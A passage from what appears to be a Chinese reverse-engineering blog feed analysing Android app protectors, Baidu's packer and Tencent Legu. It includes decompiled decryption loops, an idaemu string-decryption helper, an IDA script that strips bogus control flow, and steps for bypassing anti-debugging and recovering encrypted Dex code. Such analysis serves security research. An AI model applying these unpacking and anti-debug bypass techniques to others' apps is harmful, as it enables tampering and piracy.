    break;
  *(_BYTE *)(*v42 + (*v152)++) = 0;
}

....

*v46 = (*v41)-&gt;e_ehsize;
for ( *v48 = 0; ; ++*v48 )                // memset(elf header, 0, e_ehsize)
{
  v49 = 0;
  if ( *v48 &lt; (unsigned int)*v46 )
    v49 = 1;
  if ( !(v49 &amp; 1) )
    break;
  (*v41)-&gt;e_ident[*v48] = 0;
}
v18 = v39;
</code></pre><p>修改 0x2000 - 0x3B971的内存属性</p>
<pre><code>syscall(125, *v172, *v161, 7);  // mprotect(v172, 0x00039971, PROT_READ | PROT_WRITE | PROT_EXEC)
</code></pre><p>解密 0x2f75 - 0x3B971</p>
<pre><code>v15 = v153;                                 // 0x2f75
for ( *i = 6; ; *i = 6 )                    // for(i = 0; i &lt; 0x0001C4FE; i++)
{
  v5 = 0;
  if ( *v180 &gt;= *v146 )
    v5 = 1;
  if ( v5 &amp; 1 )
    break;
  *i = 17;
  *v160 = (int)*v15 + *v180;                // 0x2f75 + i
  *i = 10;
  *v159 = (int)off_56008 + (_DWORD)*v15 - *v180 - 1;// 0x389fc + 0x2f75 - i - 1
  *i = 26;
  v32 = v160;
  v33 = v145;
  *(_BYTE *)v145 = *(_BYTE *)*v160;
  v34 = v159;
  *(_BYTE *)*v32 = *(_BYTE *)*v159;         // 0x2f75[i] = *(0x389fc + 0x2f75 - i - 1)
  *(_BYTE *)*v34 = *(_BYTE *)v33;           // *(0x389fc + 0x2f75 - i - 1) = 0x2f75[i]
  *i = 16;
  ++*v180;
}
</code></pre><p>从上面的代码可以看出，它将0x2f75 - 0x3B971这块区域的字节调换，达到加密的效果。</p>
<h3 id="JNI-OnLoad函数"><a href="#JNI-OnLoad函数" class="headerlink" title="JNI_OnLoad函数"></a>JNI_OnLoad函数</h3><p>一番折腾后，终于能看见JNI_Onload函数了。糟糕的是，这个函数也加了BCF，不过还好，用上面的方法也能去掉混淆。</p>
<p>JNI_OnLoad主要做了这些操作:</p>
<pre><code>1. 初始化函数指针（该so不直接调用c运行时的函数）
2. 创建一些线程（反调试以及一些全局变量初始化）
3. 加载dex
</code></pre><h3 id="加密的字符串"><a href="#加密的字符串" class="headerlink" title="加密的字符串"></a>加密的字符串</h3><p>大量的字符串被加密了，并且每个解密函数都不一样。逆就懒得逆了，反编译看了一下，它们长的都差不多，用idaemu模拟执行一下也是可以的。</p>
<pre><code>def get_str(addr, size, uc):
    return uc.mem_read(addr, size).decode(&apos;ascii&apos;)

def emulate(addr, args):
    heap_addr = 0x80000
    head_size = 0x1024
    malloc_size = [None]
    def malloc_hook(uc, out, args):
        malloc_size[0] = args[0]
        return heap_addr

    mu = idaemu.Emu(idaemu.UC_ARCH_ARM, idaemu.UC_MODE_THUMB)
    # heap
    mu.setData(heap_addr, &apos;\x00&apos; * head_size)

    mu.alt(0x000028EC, malloc_hook, 1)

    ret = mu.eFunc(addr, None, args)
    return get_str(ret, malloc_size[0], mu.curUC)
</code></pre><p>调用<code>emulate</code>函数就能得到每个字符串原本的模样了。</p>
<p>对了，idaemu执行thumb的代码会出错，因为它没有对地址加一。在<code>_emulate</code>函数的<code>uc.emu_start</code>调用前加一句就好了</p>
<pre><code>def _emulate(...):
    ...
    if self.mode == UC_MODE_THUMB:
        startAddr |= 1
    uc.emu_start(startAddr, stopAddr, timeout=TimeOut, count=Count)
</code></pre><h3 id="线程和反调试"><a href="#线程和反调试" class="headerlink" title="线程和反调试"></a>线程和反调试</h3><p>这里的反调试很有趣，如果检测到调试状态的话，它会将某些地方的指令修改掉，然后执行到那的时候程序就崩了，遗憾的是，有个全局变量能控制这个行为。将0x56008赋为0的话就可以绕过了（目前没有发现0x56008的其他用途）。</p>
<p>对于<code>sub_26914</code>和<code>sub_2693C</code>这两个函数，是直接调用了<code>exit</code>来结束程序，不过可以让执行这两个函数的线程直接休眠或者nop掉。</p>
<h3 id="Dex加载"><a href="#Dex加载" class="headerlink" title="Dex加载"></a>Dex加载</h3><p>为了进行解密，需要在加载之前，Hook一些函数。</p>
<p>首先校验apk文件中的classes.dex文件的大小是否一致，如果一致，将<code>assets/baiduprotect&lt;i&gt;.jar</code>解压到<code>/data/data/xxxxxxx/.&lt;i&gt;/1.jar</code>，<code>i</code>是一个从1开始的整数。接着，使用类加载器进行加载Dex，在加载Dex的时候会调用到被Hook的函数，这时候进行解密操作。加载完成之后，将Dex加入当前环境，这就完成了解固操作。</p>
<h3 id="解密jar"><a href="#解密jar" class="headerlink" title="解密jar"></a>解密jar</h3><p>首先对1.jar的前0x1000个字节解密</p>
<pre><code>/*
    v8 是密钥，来自程序的签名
    v6 是指向待解密区域的指针
    a5 是包名异或之后的值
*/
...
v39 = a3 - 16;
v19 = (a3 - 16) &amp; 0xFFFFFFF0;
v12 = (char *)a1 + v19 + 16;
do
{
    v20 = v9;
    v21 = v8;
    ((void (__fastcall *)(_DWORD *, int *, int))v9)(v6, &amp;v41, v8); // aes
    v10 -= 16;
    v8 = v21;
    v22 = *v6;
    v9 = v20;
    *v6 = *(_DWORD *)a5 ^ v41;
    *(_DWORD *)a5 = v22;
    v23 = v6[1];
    v6[1] = *((_DWORD *)a5 + 1) ^ v42;
    *((_DWORD *)a5 + 1) = v23;
    v24 = v6[2];
    v6[2] = *((_DWORD *)a5 + 2) ^ v43;
    *((_DWORD *)a5 + 2) = v24;
    v25 = v6[3];
    v6[3] = *((_DWORD *)a5 + 3) ^ v44;
    v6 += 4;
    *((_DWORD *)a5 + 3) = v25;
}
while ( v10 &gt; 0xF );
...
</code></pre><p>解密jar完成之后，解压里面的classes.dex到内存，进行类数据的解密和修复。</p>
<p>在dex文件偏移 file length - 280 处，有一个结构体，记录着类数据相关信息：</p>
<pre><code>struct java_class_info {
    int        pos;     // map item 位置
    int        size;    // 类数据大小
    int        offset; // 原类数据偏移
    int        encrypted; // 已加密的类数据偏移
};
</code></pre><p>已加密的类数据偏移计算方法是：<code>file length - 280 - java_class_info.encrypted - 4 * 类数量 - java_class_info.size</code>。</p>
<p>解密类数据:</p>
<pre><code>v13 = (v10-&gt;dataSize + 1)
    * (v11 + 1)
    * (v10-&gt;fieldIdsSize + 1)
    * (v10-&gt;protoIdsSize + 1)
    * (v10-&gt;typeIdsSize + 1)
    * (v10-&gt;stringIdsSize + 1)
    * (v10-&gt;methodIdsSize + 1);
v14 = (v13 &gt;&gt; 6) &amp; 0x3FC;
v15 = (unsigned __int16)v13 &gt;&gt; 8;

v17 = -256 - v14;
if ( !v15 )
    v17 = -260;

v31 = &amp;off_553D8;
sub_3B90C((int)&amp;v31, 0, x + v17, 0x100u);            // x 是上面已加密的类数据偏移计算的结果
memcpy(java_class_info.offset, x, v18[1]);
// 解密
sub_3B758(&amp;v31, java_class_info.offset, java_class_info.size, java_class_info.offset);
</code></pre><p>上面两个函数就不贴了，都是异或。然后插入一个map item，类型是kDexTypeClassDataItem。</p>
<pre><code>if ( java_class_info.pos ) {
    map_off = v6-&gt;pHeader-&gt;mapOff;
    map_addr = map_off + 4 + base addr;
    memcpy(&amp;v30, map_addr + 12 * map size, 12);

    // map item 后移
    for( i = map size; i &gt; java_class_info.pos; i--) {
        addr = 12 * i + map_addr;
        memcpy(addr, addr - 12, 12); 
    }

    memcpy(map_addr + 12 * java_class_info.pos，&amp;v30, 12);
    *map_addr += 1； 
    java_class_info.pos = 0;
}
</code></pre><p>最后是修复类偏移。</p>
<pre><code>v8 = sub_119B4(dex, v73, v71, *v7);
for(int i = 0; i &lt; v71-&gt;pHeader-&gt;classDefsSize; i++) {
    v16 = &amp;v71-&gt;pClassDefs[i];
    v16-&gt;classDataOff = ~*(v8 + 4 * i) * 291;
}
</code></pre><h3 id="去除BCF的脚本源码"><a href="#去除BCF的脚本源码" class="headerlink" title="去除BCF的脚本源码"></a>去除BCF的脚本源码</h3><pre><code>import idaapi


class BCFProcessor:
    def __init__(self):
        def state0(mnem):
            return 1 if mnem in (&apos;LDR.W&apos;, &apos;LDR&apos;) else -1
        def state1(mnem):
            return 2 if mnem in (&apos;LDR.W&apos;, &apos;LDR&apos;) else -1
        def state2(mnem):
            return 3 if mnem == &apos;ADD&apos; else -1
        def state3(mnem):
            return 4 if mnem in (&apos;LDR.W&apos;, &apos;LDR&apos;) else -1
        def state4(mnem):
            return 5 if mnem in (&apos;LDR.W&apos;, &apos;LDR&apos;) else -1
        def state5(mnem):
            return 6 if mnem in (&apos;LDR.W&apos;, &apos;LDR&apos;) else -1
        def state6(mnem):
            if mnem == &apos;SUBS&apos;:
                return 7
            elif mnem == &apos;MOV&apos;:
                return 6
            return -1
        def state7(mnem):
            return 8 if mnem == &apos;MULS&apos; else -1
        def state8(mnem):
            return 9 if mnem == &apos;TST.W&apos; else -1
        def state9(mnem):
            if mnem == &apos;IT NE&apos;:
                return 10
            elif mnem in (&apos;BEQ&apos;, &apos;BEQ.W&apos;):
                return 11
            elif mnem in (&apos;SUB.W&apos;, &apos;LDR.W&apos;, &apos;MOV&apos;, &apos;STR.W&apos;):
                return 9
            return -1
        def state10(mnem):
            return 15 if mnem == &apos;CMPNE&apos; else -1
        def state11(mnem):
            return 12 if mnem == &apos;CMP&apos; else -1
        def state12(mnem):
            if mnem in (&apos;BGT&apos;, &apos;BGT.W&apos;):
                return 15
            elif mnem in (&apos;BLE&apos;, &apos;BLE.W&apos;):
                return 14
            return -1
        def state13(mnem):
            return 3 if mnem in (&apos;LDR.W&apos;, &apos;LDR&apos;) else -1

        self.func_maps = []
        for i in xrange(0, 14):
            self.func_maps.append(locals().get(&apos;state{}&apos;.format(i)))

    def check(self, ea):
        self.state = -1
        self.patch_ea = []

        state = 0
        new_ea = get_prev_ea(ea, 3)
        if idc.GetMnem(new_ea) not in (&apos;LDR.W&apos;, &apos;LDR&apos;):
            new_ea = get_prev_ea(ea, 1)
            assert(idc.GetMnem(new_ea) in (&apos;LDR.W&apos;, &apos;LDR&apos;))
            state = 13

        ea = new_ea
        while True:
            ori_state = state
            mnem = idc.GetMnem(ea)
            state = self.func_maps[state](mnem)
            if state == -1:
                return False, ea
            elif state in (14, 15):
                break

            if ori_state != state:
                self.patch_ea.append(ea)

            ea += ItemSize(ea)

        self.state = state
        self.end_ea = ea
        return True, ea

    def patch(self): 
        end_size = ItemSize(self.end_ea)
        target_ea = idc.GetOperandValue(self.end_ea, 0)

        self.patch_ea.append(self.end_ea)
         for ea in self.patch_ea:
             ea_size = ItemSize(ea)
             fill_nop(ea, ea_size)
             print(&apos;patch: {} - {}&apos;.format(hex(ea), hex(ea + ea_size)))

        if self.state == 14:
            new_ea = self.end_ea
            if end_size == 2:
                new_ea -= 2
            fill_bw(new_ea, target_ea)
             print(&apos;new branch: {} -&gt; {}&apos;.format(hex(new_ea), hex(target_ea)))


def is_code(ea):
    return idaapi.getFlags(ea) &amp; idaapi.MS_CLS == idaapi.FF_CODE


def fill_nop(start_ea, size):
    nop_opcode = 0xbf00
    for i in xrange(0, size, 2):
        idc.PatchWord(start_ea + i, nop_opcode)


def fill_bw(ea, target_ea):
    offset = (target_ea - ea - 4) / 2
    imm11 = offset &amp; 0x7ff
    imm10 = offset &gt;&gt; 11 &amp; 0x3ff 
    s = 0 if offset &gt;= 0 else 1
    j1 = offset &gt;&gt; 21 &amp; 1 ^ 1 ^ s
    j2 = offset &gt;&gt; 20 &amp; 1 ^ 1 ^ s

    idc.PatchWord(ea, 0xf000 | s &lt;&lt; 10 | imm10)
    idc.PatchWord(ea + 2, 0x9000 | j1 &lt;&lt; 13 | j2 &lt;&lt; 11 | imm11)


def get_prev_ea(ea, n):
    for _ in range(0, n):
        ea = idc.prev_head(ea)

    assert(ea != idaapi.BADADDR)

    return ea


def match_instruction(inst_list, ea):
    for inst in inst_list:
        if idc.GetMnem(ea) != inst:
            return False, ea

        ea += ItemSize(ea)

    return True, ea


def clean_node(func):
    done = False
    while not done:
        done = True

        q = idaapi.qflow_chart_t(&quot;The title&quot;, func, 0, 0, idaapi.FC_PREDS)
        assert(q[0].start_ea == func.start_ea)
        for n in xrange(1, q.size()):
            b = q[n]
            if q.npred(n) != 0:
                continue

            done = False
            size = b.end_ea - b.start_ea
            MakeUnknown(b.start_ea, size, idaapi.DOUNK_SIMPLE)
            MakeData(b.start_ea, idaapi.FF_BYTE, size, 0)


def bcf(x, y, cur_func):
    processor = BCFProcessor()
    xrefs = XrefsTo(x)

    for xref in xrefs:
        if xref.frm &lt; cur_func.start_ea or \
            xref.frm &gt; cur_func.end_ea:
            continue

        if not is_code(xref.frm):
            print(&apos;{}: expecting code reference, skip.&apos;.format(hex(xref.frm)))
            continue

        ret, ea = processor.check(xref.frm)
        if not ret:
            print(&apos;{}: unexpected instruction, skip.&apos;.format(hex(ea)))
            continue

        processor.patch()

    idc.plan_and_wait(cur_func.start_ea, cur_func.end_ea)

    clean_node(cur_func)

def main(cur_func):
    x = 0x597F0
    y = 0x59800
    # x = 0x597F0 
    # y = 0x59800
    bcf(x, y, cur_func)


if __name__ == &apos;__main__&apos;:
    main(idaapi.get_func(here()))
</code></pre><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://security.tencent.com/index.php/blog/msg/112" target="_blank" rel="noopener">[1] 利用符号执行去除控制流平坦化 </a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;被加密的JNI-OnLoad&quot;&gt;&lt;a href=&quot;#被加密的JNI-OnLoad&quot; class=&quot;headerlink&quot; title=&quot;被加密的JNI_OnLoad&quot;&gt;&lt;/a&gt;被加密的JNI_OnLoad&lt;/h3&gt;&lt;p&gt;在IDA中查看JNI_OnLoad函数，可以
    
    </summary>
    
    
      <category term="Android加固" scheme="http://www.ench4nt3r.com/tags/Android%E5%8A%A0%E5%9B%BA/"/>
    
  </entry>
  
  <entry>
    <title>乐固（libshella 2.10.5.7）加固分析</title>
    <link href="http://www.ench4nt3r.com/2017/09/10/legu-reverse/"/>
    <id>http://www.ench4nt3r.com/2017/09/10/legu-reverse/</id>
    <published>2017-09-10T09:37:00.000Z</published>
    <updated>2017-09-10T09:58:32.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x1-init-array-0-函数"><a href="#0x1-init-array-0-函数" class="headerlink" title="0x1 init_array[0]函数"></a>0x1 init_array[0]函数</h3><p>在第一个init_array函数中，首先会对 0x2000 - 0x3AAC的这块区域解密，解密代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">byte v98 = <span class="number">43</span>;</span><br><span class="line">byte v89 = <span class="number">-111</span>;</span><br><span class="line">byte v97 = <span class="number">-103</span>;</span><br><span class="line">byte v96 = <span class="number">32</span>;</span><br><span class="line">byte v95 = <span class="number">21</span>;</span><br><span class="line">byte v87 = <span class="number">0</span>;</span><br><span class="line">byte *v88 = base_addr;</span><br><span class="line">mprotect(base_addr + <span class="number">0x2000</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE);</span><br><span class="line"><span class="keyword">for</span> ( j = <span class="number">0x2000</span>; j &lt;= <span class="number">0x3AAC</span>; ++j)</span><br><span class="line">&#123;</span><br><span class="line">  v87 = v88[j];</span><br><span class="line">  v89 = (((v97 - v96) ^ j) + v95) ^ v98;</span><br><span class="line">  v88[j] ^= v89;</span><br><span class="line">  v88[j] += v96 &amp; v95 ^ v97;</span><br><span class="line">  v98 += (v97 + v96 - v95) &amp; v87 &amp; j;</span><br><span class="line">  v97 += (j + v98) ^ v87;</span><br><span class="line">  v96 ^= (v87 - v98) ^ j;</span><br><span class="line">  v95 += j - (v87 + v98);</span><br><span class="line">&#125;</span><br><span class="line">mprotect(base_addr + <span class="number">0x2000</span>, <span class="number">0x2000</span>, PROT_READ | PROT_EXEC);</span><br></pre></td></tr></table></figure>
<p>解密会解出<code>JNI_Onload</code>和一个反调试函数，在解密完成后会调用<code>pthread_create</code>创建一个线程执行反调试函数。</p>
<p><br></p>
<h3 id="0x2-反调试"><a href="#0x2-反调试" class="headerlink" title="0x2 反调试"></a>0x2 反调试</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_36E8</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// r0@1</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [sp+4h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  dword_5018 = <span class="number">0</span>;</span><br><span class="line">  result = pthread_create((<span class="keyword">int</span>)&amp;v1, <span class="number">0</span>, (<span class="keyword">int</span>)sub_335C, g_base_addr);</span><br><span class="line">  dword_501C = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>反调试的手段有3种，分别是：</p>
<pre><code>1.监听/proc/self/mem, /proc/self/task/&lt;thread_id&gt;/mem的改变
2.检测/prc/self/status的State和TracerPid字段
3.对LOAD0(Program header)段进行校验
</code></pre><p><br></p>
<h3 id="0x3-JNI-Onload"><a href="#0x3-JNI-Onload" class="headerlink" title="0x3 JNI_Onload"></a>0x3 JNI_Onload</h3><p>这是一个假JNI_Onload，主要工作是解压出真正的so。</p>
<p><br><br>解压之前，会从文件偏移0x7DF8处读出一个结构体，存储着解压的必要信息。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">compression_info</span> &#123;</span></span><br><span class="line">	<span class="keyword">void</span>*	min_vaddr;</span><br><span class="line">	<span class="keyword">int</span>		size;</span><br><span class="line">	int16	segment_offset;	<span class="comment">// 需要被解压的段的偏移 (段结构: segment_compression_info)</span></span><br><span class="line">	int16	segment_num;		<span class="comment">// 段的数量</span></span><br><span class="line">	<span class="keyword">int</span>		unknow2;</span><br><span class="line">	<span class="keyword">int</span>		strtab;				<span class="comment">// 字符串表偏移</span></span><br><span class="line">	<span class="keyword">int</span>		symtab;			<span class="comment">// 符号表偏移</span></span><br><span class="line">	<span class="keyword">int</span>		init_func;		        <span class="comment">// init_func偏移</span></span><br><span class="line">	<span class="keyword">int</span>		init_array;			<span class="comment">// init_array偏移</span></span><br><span class="line">	<span class="keyword">int</span>		unknow7;</span><br><span class="line">	<span class="keyword">int</span>		unknow8;</span><br><span class="line">	int16	unknow9;</span><br><span class="line">	int16	init_array_num;</span><br><span class="line">	int16	needed_so_num;	<span class="comment">// 需要被加载的动态库数量</span></span><br><span class="line">	int16	unknow11;</span><br><span class="line">	<span class="keyword">int</span>		needed_so_tab;	<span class="comment">// 需要被加载的动态库表的偏移</span></span><br><span class="line">	<span class="keyword">int</span>		unknow13;</span><br><span class="line">	<span class="keyword">int</span>		symtab_num;</span><br><span class="line">	<span class="keyword">int</span>		hashtab;</span><br><span class="line">	<span class="keyword">int</span>		relocate0_tab;		<span class="comment">// 第一个重定位表的偏移</span></span><br><span class="line">	<span class="keyword">int</span>		relocate0_num;</span><br><span class="line">	<span class="keyword">int</span>		relocate1_num;</span><br><span class="line">	<span class="keyword">int</span>		relocate1_tab;		<span class="comment">// 第二个重定位表的偏移</span></span><br><span class="line">	<span class="keyword">int</span>		unknow14;</span><br><span class="line">	<span class="keyword">int</span>		unknow16;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">segment_compression_info</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span>		vaddr;</span><br><span class="line">	<span class="keyword">int</span>		memsz;</span><br><span class="line">	<span class="keyword">int</span>		offset;</span><br><span class="line">	<span class="keyword">int</span>		filesz;</span><br><span class="line">	<span class="keyword">int</span>		flags;</span><br><span class="line">	<span class="keyword">int</span>		encrypted_size;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>读完必要的信息之后，对每个段进行解压：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( (<span class="keyword">unsigned</span> __int16)v17.segment_num &gt; v38 )</span><br><span class="line">&#123;</span><br><span class="line">  v29 = segment_data-&gt;vaddr + load_bias;</span><br><span class="line">  v28 = segment_data-&gt;memsz + v29;</span><br><span class="line">  v27 = v29 &amp; <span class="number">0xFFFFF000</span>;</span><br><span class="line">  v26 = (v28 + <span class="number">4095</span>) &amp; <span class="number">0xFFFFF000</span>;</span><br><span class="line">  v25 = v26 - (v29 &amp; <span class="number">0xFFFFF000</span>);</span><br><span class="line">  uncompressed_size = <span class="number">0</span>;                      <span class="comment">// 已解压的数据大小</span></span><br><span class="line">  infsize = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( segment_data-&gt;filesz )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = <span class="number">-1</span>;</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    mmap(v27, v25, <span class="number">3</span>, <span class="number">50</span>);</span><br><span class="line">    v13.zalloc = <span class="number">0</span>;</span><br><span class="line">    v13.zfree = <span class="number">0</span>;</span><br><span class="line">    v13.opaque = <span class="number">0</span>;</span><br><span class="line">    v13.avail_in = <span class="number">0</span>;</span><br><span class="line">    v13.next_in = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( inflateInit2_(&amp;v13, <span class="number">-15</span>, <span class="string">"1.2.3"</span>, <span class="number">56</span>) )</span><br><span class="line">      ;</span><br><span class="line">    <span class="keyword">while</span> ( segment_data-&gt;filesz &gt; uncompressed_size )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 每次只解压1KB</span></span><br><span class="line">      <span class="keyword">if</span> ( uncompressed_size + <span class="number">4096</span> &lt;= segment_data-&gt;filesz )</span><br><span class="line">        <span class="comment">// 大于0x1000</span></span><br><span class="line">        v4 = <span class="number">4096</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="comment">// 剩余的size</span></span><br><span class="line">        v4 = segment_data-&gt;filesz - uncompressed_size;</span><br><span class="line">      v24 = v4;</span><br><span class="line">      <span class="keyword">if</span> ( uncompressed_size + <span class="number">4096</span> &lt;= segment_data-&gt;encrypted_size )</span><br><span class="line">        v5 = <span class="number">4096</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v5 = segment_data-&gt;encrypted_size - uncompressed_size;</span><br><span class="line">      v23 = v5;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 读段数据</span></span><br><span class="line">      v24 = pread(v33, &amp;v14, v24, segment_data-&gt;offset + offset + uncompressed_size);</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 解密</span></span><br><span class="line">      sub_122C((<span class="keyword">int</span>)<span class="string">"Tx:12345Tx:12345"</span>, (<span class="keyword">int</span>)&amp;v14, v23, <span class="number">16</span>);</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 解压</span></span><br><span class="line">      v13.avail_in = v24;</span><br><span class="line">      v13.next_in = (Bytef *)&amp;v14;</span><br><span class="line">      _android_log_print(<span class="number">6</span>, <span class="string">"txtag"</span>, <span class="string">"read count:%x"</span>, v24, v9, v10);</span><br><span class="line">      v13.avail_out = <span class="number">0x100000</span>;</span><br><span class="line">      v13.next_out = (Bytef *)(infsize + v29);</span><br><span class="line">      v22 = inflate(&amp;v13, <span class="number">0</span>);                 </span><br><span class="line">      infsize = infsize - v13.avail_out + <span class="number">0x100000</span>;</span><br><span class="line">      uncompressed_size += v24;</span><br><span class="line">    &#125;</span><br><span class="line">    inflateEnd(&amp;v13);</span><br><span class="line">    <span class="keyword">for</span> ( i = v29; infsize + v29 &gt; i; i += <span class="number">1024</span> )</span><br><span class="line">      cacheflush_0(i, <span class="number">1024</span>);</span><br><span class="line">    _android_log_print(</span><br><span class="line">      <span class="number">6</span>,</span><br><span class="line">      <span class="string">"txtag"</span>,</span><br><span class="line">      <span class="string">"seg_start:%p size:%x infsize:%x offset:%x\n"</span>,</span><br><span class="line">      v29,</span><br><span class="line">      segment_data-&gt;filesz,</span><br><span class="line">      infsize,</span><br><span class="line">      segment_data-&gt;offset);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( segment_data-&gt;flags &amp; <span class="number">2</span> &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)(infsize &amp; <span class="number">0xFFF</span>) &gt; <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">memset</span>((<span class="keyword">void</span> *)(infsize + v29), <span class="number">0</span>, <span class="number">4096</span> - ((infsize + v29) &amp; <span class="number">0xFFF</span>));</span><br><span class="line">  ++v38;</span><br><span class="line">  ++segment_data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>可以看到，在解压之前，还会对段数据进行解密：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">fastcall <span class="title">sub_122C</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">unsigned</span> <span class="keyword">int</span> a3, <span class="keyword">int</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [sp+0h] [bp-24h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [sp+Ch] [bp-18h]@1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// [sp+10h] [bp-14h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [sp+14h] [bp-10h]@1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [sp+18h] [bp-Ch]@5</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v10; <span class="comment">// [sp+1Ch] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v6 = a1;</span><br><span class="line">  v5 = a4;</span><br><span 